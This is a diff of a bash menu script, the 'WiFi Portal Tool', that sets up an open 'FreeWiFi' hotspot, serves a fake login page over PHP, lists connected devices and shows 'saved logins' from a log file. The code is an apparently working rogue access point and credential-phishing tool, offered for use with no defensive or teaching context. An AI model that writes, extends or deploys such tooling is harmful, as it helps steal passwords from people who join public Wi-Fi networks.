@@ -3,29 +3,55 @@
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
 HOTSPOT_IFACE="wlp4s0"
+INTERNET_IFACE=""  # Leave empty for hotspot-only
+SSID="FreeWiFi"
 
 # ---------------------------
-# Detect existing hotspot and remove password
+# Check if create_ap is installed
 # ---------------------------
-make_hotspot_open() {
-    ACTIVE_HOTSPOT=$(nmcli -t -f NAME,TYPE,DEVICE connection show --active | grep ":wifi:$HOTSPOT_IFACE" | cut -d: -f1)
-    if [ -z "$ACTIVE_HOTSPOT" ]; then
-        echo "[!] No active hotspot detected on $HOTSPOT_IFACE."
-        return 1
+check_create_ap() {
+    if ! command -v create_ap >/dev/null 2>&1; then
+        echo "[-] create_ap is not installed!"
+        echo "Install it first: https://github.com/oblique/create_ap"
+        exit 1
     fi
+}
 
-    echo "[+] Hotspot detected: $ACTIVE_HOTSPOT. Removing password..."
-    # Set open network
-    nmcli connection modify "$ACTIVE_HOTSPOT" 802-11-wireless-security.key-mgmt none
-    nmcli connection up "$ACTIVE_HOTSPOT"
-    echo "[+] Hotspot is now open."
+# ---------------------------
+# Start open hotspot
+# ---------------------------
+start_hotspot() {
+    if pgrep create_ap >/dev/null 2>&1; then
+        echo "[!] Hotspot already running."
+        return
+    fi
+    echo "[+] Starting open hotspot on $HOTSPOT_IFACE..."
+    sudo create_ap --no-virt "$HOTSPOT_IFACE" "$INTERNET_IFACE" "$SSID" "" -B
+    sleep 2
+    if pgrep create_ap >/dev/null 2>&1; then
+        echo "[+] Hotspot started successfully!"
+    else
+        echo "[-] Failed to start hotspot. Check your Wi-Fi interface and driver."
+    fi
+}
+
+# ---------------------------
+# Stop hotspot
+# ---------------------------
+stop_hotspot() {
+    if pgrep create_ap >/dev/null 2>&1; then
+        sudo pkill create_ap
+        echo "[+] Hotspot stopped."
+    else
+        echo "[!] No hotspot is running."
+    fi
 }
 
 # ---------------------------
 # Show connected devices
 # ---------------------------
 show_connected_devices() {
-    echo "[+] Connected devices:"
+    echo "[+] Connected devices (ARP table):"
     arp -n | grep -v "incomplete"
 }
 
@@ -37,7 +63,7 @@ start_server() {
         echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
         return
     fi
-    echo "[+] Starting portal server..."
+    echo "[+] Starting login page server..."
     cd "$PORTAL_DIR" || exit
     php -S 0.0.0.0:8080
 }
@@ -60,9 +86,7 @@ view_logs() {
 # ---------------------------
 live_logs() {
     echo "[+] Live log view (Ctrl+C to exit)"
-    if [ ! -f "$LOG_FILE" ]; then
-        touch "$LOG_FILE"
-    fi
+    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
     tail -f "$LOG_FILE"
 }
 
@@ -91,29 +115,33 @@ setup() {
 # ---------------------------
 # Main Menu
 # ---------------------------
+check_create_ap
+
 while true; do
     echo ""
     echo "====== WiFi Portal Tool ======"
     echo "1) Setup (first time)"
-    echo "2) Make Existing Hotspot Open"
-    echo "3) Show Connected Devices"
-    echo "4) Start Login Page Server"
-    echo "5) View Saved Logins"
-    echo "6) Live View Logs"
-    echo "7) Edit Login Page"
-    echo "8) Exit"
+    echo "2) Start Open Hotspot"
+    echo "3) Stop Hotspot"
+    echo "4) Show Connected Devices"
+    echo "5) Start Login Page Server"
+    echo "6) View Saved Logins"
+    echo "7) Live View Logs"
+    echo "8) Edit Login Page"
+    echo "9) Exit"
     echo "=============================="
     read -p "Select option: " choice
 
     case $choice in
         1) setup ;;
-        2) make_hotspot_open ;;
-        3) show_connected_devices ;;
-        4) start_server ;;
-        5) view_logs ;;
-        6) live_logs ;;
-        7) edit_page ;;
-        8) echo "Exiting..."; exit ;;
+        2) start_hotspot ;;
+        3) stop_hotspot ;;
+        4) show_connected_devices ;;
+        5) start_server ;;
+        6) view_logs ;;
+        7) live_logs ;;
+        8) edit_page ;;
+        9) echo "Exiting..."; exit ;;
         *) echo "Invalid option" ;;
     esac
 done
